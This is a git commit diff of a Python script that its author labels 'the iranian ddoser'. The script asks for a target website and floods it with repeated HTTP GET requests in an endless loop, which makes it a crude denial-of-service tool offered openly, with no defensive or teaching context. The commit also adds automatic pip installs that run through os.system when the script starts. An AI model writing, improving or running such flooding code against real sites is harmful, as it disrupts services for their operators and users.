c01e4c579edefe463f821108cf7dfeb0708e8c73
Zone-Py <40041432+ZonePy@users.noreply.github.com>
2018-07-21 00:59:11 +0430

    the iranian ddoser was updated!

--- ddos.py
+++ ddos.py
@@ -1,22 +1,55 @@
 import os
 
-os.system('pip install termcolor && pip install colored && clear')
+os.system('pip install termcolor && pip install colored && pip install requests && clear')
 import termcolor
 from termcolor import colored
 
-print(colored("**********************",'blue'))
-print(colored("*                    *",'blue'))
-print(colored("*   Ddos with Kali   *",'blue'))
-print(colored("*                    *",'blue'))
-print(colored("**********************",'blue'))
-print(colored("----------------------",'blue'))
+def main():
+
+    print(colored("************************",'blue'))
+    print(colored("*                      *",'blue'))
+    print(colored("*    Ddos with Kali    *",'blue'))
+    print(colored("*                      *",'blue'))
+    print(colored("************************",'blue'))
+
+    print(colored("| made by: KaMrAn ZoNe |\n", 'green'))
+
+
+main()
 
 import requests
 def dos():
 
-        s = input("enter your target\n example: http://site.ir\n~> ")
+        s = input(colored("enter your target\n example: site.ir\n\n ~> ",'magenta'))
 
-        while True:
-            r = requests.get(s)
-            print(colored("Pocket was sent",'red'))
+        r = requests.get("http://"+s)
+
+        print(colored("\nPocket was sent",'red'))
+
+        r = requests.get("http://"+s)
+
+        print(colored("Pocket was sent",'blue'))
+
+        r = requests.get("http://"+s)
+
+        print(colored("Pocket was sent",'red'))
+
+        r = requests.get("http://"+s)
+
+        print(colored("Pocket was sent",'blue'))
+
+        c = input(colored("Do you want continue? y/n? ~> ",'yellow'))
+
+        if c == 'y':
+            while True:
+                r = requests.get("http://"+s)
+                print(colored("Pocket was sent", 'red'))
+                r = requests.get("http://"+s)
+                print(colored("Pocket was sent", 'blue'))
+        elif c == 'n':
+            os.system('clear')
+            main()
+            dos()
+
+
 dos()
